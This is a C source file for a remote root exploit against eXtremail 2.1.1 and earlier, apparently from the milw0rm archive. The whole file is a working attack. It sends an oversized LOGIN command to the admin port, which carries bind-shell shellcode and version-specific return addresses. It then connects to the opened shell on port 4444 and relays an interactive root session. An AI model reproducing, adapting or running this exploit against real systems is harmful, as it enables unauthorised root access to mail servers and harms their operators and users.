/* extremail-v4.c
 *
 * Copyright (c) 2006 by <mu-b@digit-labs.org>
 *
 * eXtremail <=2.1.1 remote root exploit (x86-lnx)
 * by mu-b - Sun Oct 08 2006
 *
 * - Tested on: eXtremail 2.1.1 (lnx)
 *
 * Overflow in LOGIN command of admin interface.
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.digit-labs.org/ -- Digit-Labs 2006!@$!
 */

#include <stdio.h>
#include <stdlib.h>

#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netdb.h>

#define BUF_SIZE    8192
#define NOP         0x41
#define PAD         0           /* do you feel lucky? */

#define DEF_PORT    4501
#define PORT_ADMIN  DEF_PORT
#define PORT_SHELL  4444

static const char bndshell_lnx[] =
  "\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96"
  "\x43\x52\x66\x68\x11\x5c\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56"
  "\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1"
  "\xb0\x66\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0"
  "\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
  "\x89\xe1\xcd\x80";

#define NUM_TARGETS 2

struct target_t
{
  const char *name;
  const int len;
  const char *zshell;
  const int zshell_pos;
  const int fp_pos;
  const unsigned long fp;
};

/* fp = objdump -D smtpd | grep "ff e4" */
struct target_t targets[] = {
  {"Linux eXtremail 2.1.1 (tar.gz)", 788, bndshell_lnx, 600,
   787 - 2 * sizeof (unsigned long), 0x08216357},
  {"Linux eXtremail 2.1.0 (tar.gz)", 788, bndshell_lnx, 600,
   787 - 2 * sizeof (unsigned long), 0x08216377},
  {0}
};

static int sockami (char * host, int port);
static void shellami (int sock);
static void zbuffami (char * zbuf, struct target_t *trgt);
static void zbuffcheck (char * zbuf);

static int
sockami (char * host, int port)
{
  struct sockaddr_in address;
  struct hostent *hp;
  int sock;

  fflush (stdout);
  if ((sock = socket (AF_INET, SOCK_STREAM, 0)) == -1)
    {
      perror ("socket()");
      exit (-1);
    }

  if ((hp = gethostbyname (host)) == NULL)
    {
      perror ("gethostbyname()");
      exit (-1);
    }

  memset (&address, 0, sizeof (address));
  memcpy ((char *) &address.sin_addr, hp->h_addr, hp->h_length);
  address.sin_family = AF_INET;
  address.sin_port = htons (port);

  if (connect (sock, (struct sockaddr *) &address, sizeof (address)) == -1)
    {
      perror ("connect()");
      exit (EXIT_FAILURE);
    }

  return (sock);
}

static void
shellami (int sock)
{
  int n;
  fd_set rset;
  char recvbuf[1024], *cmd = "id; uname -a; uptime\n";

  send (sock, cmd, strlen (cmd), 0);

  while (1)
    {
      FD_ZERO (&rset);
      FD_SET (sock, &rset);
      FD_SET (STDIN_FILENO, &rset);
      select (sock + 1, &rset, NULL, NULL, NULL);
      if (FD_ISSET (sock, &rset))
        {
          if ((n = read (sock, recvbuf, sizeof (recvbuf) - 1)) <= 0)
            {
              fprintf (stderr, "Connection closed by foreign host.\n");
              exit (EXIT_SUCCESS);
            }
          recvbuf[n] = '\0';    /* off-by-one */
          printf ("%s", recvbuf);
        }
      if (FD_ISSET (STDIN_FILENO, &rset))
        {
          if ((n = read (STDIN_FILENO, recvbuf, sizeof (recvbuf) - 1)) > 0)
            {
              recvbuf[n] = '\0';
              write (sock, recvbuf, n);
            }
        }
    }
}

static void
zbuffami (char * zbuf, struct target_t *trgt)
{
  unsigned long rel_pos;

  memset (zbuf, NOP, trgt->len);
  memcpy (zbuf + trgt->zshell_pos, trgt->zshell, strlen (trgt->zshell));

  rel_pos = (trgt->fp_pos + 8 - trgt->zshell_pos) + PAD;
  printf ("\n++call back addy: 0x%x, fp:0x%x...", (int) ~rel_pos,
          (int) trgt->fp);

  zbuf[trgt->fp_pos] = (u_char) (trgt->fp & 0x000000ff);
  zbuf[trgt->fp_pos + 1] = (u_char) ((trgt->fp & 0x0000ff00) >> 8);
  zbuf[trgt->fp_pos + 2] = (u_char) ((trgt->fp & 0x00ff0000) >> 16);
  zbuf[trgt->fp_pos + 3] = (u_char) ((trgt->fp & 0xff000000) >> 24);
  zbuf[trgt->fp_pos + 4] = (u_char) 0xe8;       /* call ~rel_pos */
  zbuf[trgt->fp_pos + 5] = (u_char) (~rel_pos & 0x000000ff);
  zbuf[trgt->fp_pos + 6] = (u_char) ((~rel_pos & 0x0000ff00) >> 8);
  zbuf[trgt->fp_pos + 7] = (u_char) ((~rel_pos & 0x00ff0000) >> 16);
  zbuf[trgt->fp_pos + 8] = (u_char) ((~rel_pos & 0xff000000) >> 24);
  zbuf[trgt->len + 1] = '\0';
}

static void
zbuffcheck (char * zbuf)
{
  if (strpbrk (zbuf, "\x0a\x0d"))
    {
      printf ("\n-Buffer contains invalid characters...\n");
      exit (EXIT_SUCCESS);
    }
}

int
main (int argc, char **argv)
{
  int sock;
  char zbuf[BUF_SIZE], sbuf[2 * BUF_SIZE];

  printf ("eXtremail <=2.1.1 remote root exploit\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2006!@$!\n\n");

  if (argc <= 2)
    {
      fprintf (stderr, "Usage: %s <host> <target>\n", argv[0]);
      exit (EXIT_SUCCESS);
    }

  if (atoi (argv[2]) >= NUM_TARGETS)
    {
      fprintf (stderr, "Only %d targets known!!\n", NUM_TARGETS);
      exit (EXIT_SUCCESS);
    }

  printf ("+Connecting to %s...", argv[1]);
  sock = sockami (argv[1], PORT_ADMIN);
  printf ("  connected\n");

#ifdef DEBUG
  sleep (15);
#endif

  printf ("+Building buffer with shellcode...");
  memset (zbuf, 0x00, sizeof (zbuf));
  zbuffami (zbuf, &targets[atoi (argv[2])]);
  zbuffcheck (zbuf);
  printf ("  done\n");

  printf ("+Making request...");
  sprintf (sbuf, "LOGIN %s digit-labs.org\n", zbuf);
  send (sock, sbuf, strlen (sbuf), 0);
  printf ("  done\n");

  printf ("+Waiting for the shellcode to be executed...\n");
  sleep (1);
  sock = sockami (argv[1], PORT_SHELL);
  printf ("+Wh00t!\n\n");
  shellami (sock);

  return (EXIT_SUCCESS);
}

// milw0rm.com [2007-10-15]
